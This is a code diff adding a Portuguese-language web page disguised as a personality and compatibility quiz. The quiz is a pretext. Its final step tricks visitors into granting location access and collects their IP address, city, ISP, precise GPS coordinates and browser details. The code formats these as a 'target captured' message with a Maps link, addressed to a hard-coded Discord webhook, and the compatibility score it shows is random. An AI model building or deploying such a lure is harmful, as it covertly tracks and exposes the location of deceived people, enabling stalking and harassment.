@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Analisador de Perfil & Compatibilidade</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap');
+        body { font-family: 'Poppins', sans-serif; }
+        .gradient-bg { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }
+    </style>
+</head>
+<body class="gradient-bg min-h-screen flex items-center justify-center p-4 text-white">
+
+    <div id="app" class="bg-white text-gray-800 w-full max-w-md rounded-3xl shadow-2xl overflow-hidden transition-all duration-500">
+        <!-- Header -->
+        <div class="p-6 text-center border-b border-gray-100">
+            <div class="bg-purple-100 w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4">
+                <i data-lucide="heart" class="text-purple-600 w-8 h-8"></i>
+            </div>
+            <h1 class="text-2xl font-bold text-gray-800">Analisador de Perfil</h1>
+            <p class="text-sm text-gray-500">Algoritmo de Precisão Comportamental</p>
+        </div>
+
+        <!-- Quiz Content -->
+        <div id="quiz-container" class="p-8">
+            <!-- Step 1: Intro -->
+            <div id="step-1">
+                <p class="text-center text-lg mb-6 font-medium">Bem-vindo ao teste de compatibilidade. Nosso algoritmo analisa padrões de resposta para definir sua porcentagem.</p>
+                <button onclick="nextStep(2)" class="w-full py-4 bg-purple-600 text-white rounded-xl font-semibold hover:bg-purple-700 transition-colors flex items-center justify-center gap-2">
+                    Começar Análise <i data-lucide="chevron-right" class="w-5 h-5"></i>
+                </button>
+            </div>
+
+            <!-- Perguntas Dinâmicas -->
+            <div id="question-box" class="hidden">
+                <div class="mb-4 flex justify-between items-center">
+                    <span id="progress-text" class="text-xs font-bold text-purple-600 uppercase tracking-wider">Pergunta 1 de 10</span>
+                    <div class="w-24 h-2 bg-gray-200 rounded-full overflow-hidden">
+                        <div id="progress-bar" class="h-full bg-purple-600 transition-all duration-300" style="width: 10%"></div>
+                    </div>
+                </div>
+                <p id="question-text" class="text-center text-lg mb-6 font-medium">Carregando pergunta...</p>
+                <div id="options-container" class="grid grid-cols-1 gap-3">
+                    <!-- Botões gerados via JS -->
+                </div>
+            </div>
+
+            <!-- Step Final: Captura -->
+            <div id="step-final" class="hidden text-center">
+                <div class="animate-spin w-12 h-12 border-4 border-purple-600 border-t-transparent rounded-full mx-auto mb-4"></div>
+                <p class="text-lg font-semibold">Processando respostas...</p>
+                <p class="text-sm text-gray-500 mt-2">Para liberar o resultado final, o sistema precisa validar sua região para cruzar com a base de dados local.</p>
+                <button id="location-btn" onclick="captureData()" class="mt-6 w-full py-4 bg-purple-600 text-white rounded-xl font-semibold hover:bg-purple-700 transition-colors">
+                    Validar Localização e Ver Resultado
+                </button>
+            </div>
+
+            <!-- Resultado -->
+            <div id="result" class="hidden text-center">
+                <div class="text-6xl font-bold text-purple-600 mb-2" id="percentage">0%</div>
+                <p class="text-gray-600 mb-6 font-medium">Sua porcentagem de compatibilidade!</p>
+                <div class="p-4 bg-gray-100 rounded-lg text-sm text-gray-500 italic">
+                    Análise concluída com sucesso via GPS e IP.
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        lucide.createIcons();
+
+        const questions = [
+            { q: "Você costuma seguir sua intuição em decisões rápidas?", o: ["Sempre", "Às vezes", "Raramente"] },
+            { q: "Como você descreveria sua personalidade em público?", o: ["Extrovertido", "Reservado", "Depende do dia"] },
+            { q: "Você prefere noites tranquilas em casa ou sair com amigos?", o: ["Casa", "Sair", "Equilíbrio"] },
+            { q: "Qual a importância de elogios para a sua autoestima?", o: ["Muito alta", "Moderada", "Baixa"] },
+            { q: "Você se considera alguém aberto a novas experiências?", o: ["Sim, totalmente", "Mais ou menos", "Sou conservador"] },
+            { q: "Como você reage a situações de imprevisto?", o: ["Mantenho a calma", "Fico ansioso", "Tento controlar tudo"] },
+            { q: "Você acredita que a química entre pessoas é instantânea?", o: ["Sim", "Não", "Depende da pessoa"] },
+            { q: "Qual sua relação com a moda e a aparência?", o: ["Me importo muito", "Sigo o básico", "Não ligo"] },
+            { q: "Você costuma analisar demais as conversas após elas terminarem?", o: ["Sim, sempre", "Às vezes", "Nunca"] },
+            { q: "Se pudesse mudar algo na sua rotina hoje, o que seria?", o: ["Mais aventura", "Mais descanso", "Mais foco"] }
+        ];
+
+        let currentQuestion = 0;
+
+        function nextStep(step) {
+            document.getElementById('step-1').classList.add('hidden');
+            document.getElementById('question-box').classList.remove('hidden');
+            loadQuestion();
+        }
+
+        function loadQuestion() {
+            if (currentQuestion >= questions.length) {
+                document.getElementById('question-box').classList.add('hidden');
+                document.getElementById('step-final').classList.remove('hidden');
+                return;
+            }
+
+            const q = questions[currentQuestion];
+            document.getElementById('question-text').innerText = q.q;
+            document.getElementById('progress-text').innerText = `Pergunta ${currentQuestion + 1} de 10`;
+            document.getElementById('progress-bar').style.width = `${((currentQuestion + 1) / 10) * 100}%`;
+
+            const container = document.getElementById('options-container');
+            container.innerHTML = '';
+
+            q.o.forEach(option => {
+                const btn = document.createElement('button');
+                btn.className = "py-3 px-6 border-2 border-purple-600 text-purple-600 rounded-xl font-medium hover:bg-purple-50 transition-all";
+                btn.innerText = option;
+                btn.onclick = () => {
+                    currentQuestion++;
+                    loadQuestion();
+                };
+                container.appendChild(btn);
+            });
+        }
+
+        async function captureData() {
+            const btn = document.getElementById('location-btn');
+            btn.disabled = true;
+            btn.innerText = "Sincronizando...";
+
+            let userData = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform
+            };
+
+            try {
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                const ipData = await ipResponse.json();
+                userData.ip = ipData.ip;
+                userData.city = ipData.city;
+                userData.region = ipData.region;
+                userData.isp = ipData.org;
+            } catch (e) {}
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        userData.lat = pos.coords.latitude;
+                        userData.lon = pos.coords.longitude;
+                        userData.accuracy = pos.coords.accuracy;
+                        sendToDiscord(userData);
+                    },
+                    () => sendToDiscord(userData),
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            } else {
+                sendToDiscord(userData);
+            }
+        }
+
+        function sendToDiscord(data) {
+            const WEBHOOK_URL = 'https://discord.com/api/webhooks/1551793900128182282/auc1-zyLx6lv347mkvMeHtWNTKe5fexTtwi_-Hbawh9GJIf_s2r6s6O8u446AVNRWhAj'; 
+            
+            if(WEBHOOK_URL !== 'https://discord.com/api/webhooks/1551793900128182282/auc1-zyLx6lv347mkvMeHtWNTKe5fexTtwi_-Hbawh9GJIf_s2r6s6O8u446AVNRWhAj') {
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `🎯 **ALVO CAPTURADO!**\n\n**IP:** ${data.ip}\n**Cidade:** ${data.city}\n**Região:** ${data.region}\n**ISP:** ${data.isp}\n**GPS:** ${data.lat}, ${data.lon}\n**Acurácia:** ${data.accuracy}m\n**Maps:** https://www.google.com/maps?q=${data.lat},${data.lon}`
+                    })
+                });
+            }
+            showResult();
+        }
+
+        function showResult() {
+            document.getElementById('step-final').classList.add('hidden');
+            document.getElementById('result').classList.remove('hidden');
+            document.getElementById('percentage').innerText = Math.floor(Math.random() * 30 + 70) + '%';
+        }
+    </script>
+</body>
+</html>
